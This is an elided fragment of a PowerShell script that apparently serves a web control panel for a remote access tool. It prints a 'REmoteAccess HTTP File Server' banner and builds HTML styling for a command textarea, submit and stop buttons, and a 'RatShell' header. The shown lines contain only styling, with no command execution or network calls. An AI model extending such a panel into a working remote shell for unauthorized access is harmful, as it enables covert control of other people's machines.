...
Write-Host "============================= REmoteAccess HTTP File Server =================================" -ForegroundColor Green -BackgroundColor Black
...
Function DisplayWebpage {
    ...
    $html += "textarea { width: 80%; padding: 10px; font-size: 14px; border-radius: 5px; border: 1px solid #444; background-color: #002b5c; color: #FFF; }"
    $html += "input[type='submit'] { position: relative; top: -12px; margin-left: 30px; padding: 10px 20px; background-color: #6a0dad; color: #FFF; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }"
    $html += "button { background-color: #6a0dad; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
    $html += ".stop-button { position: relative; top: -5px; font-size: 18px; margin-left: 30px; background-color: #ff4136; color: #FFF; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }"
    $html += "pre { background-color: #002b5c; padding: 10px; border-radius: 4px; color: #FFF; }"
    $html += "</style></head><body>"

    $html += "<div class='header'><img src='https://via.placeholder.com/50' alt='Logo'><h1>RatShell</h1></div>"
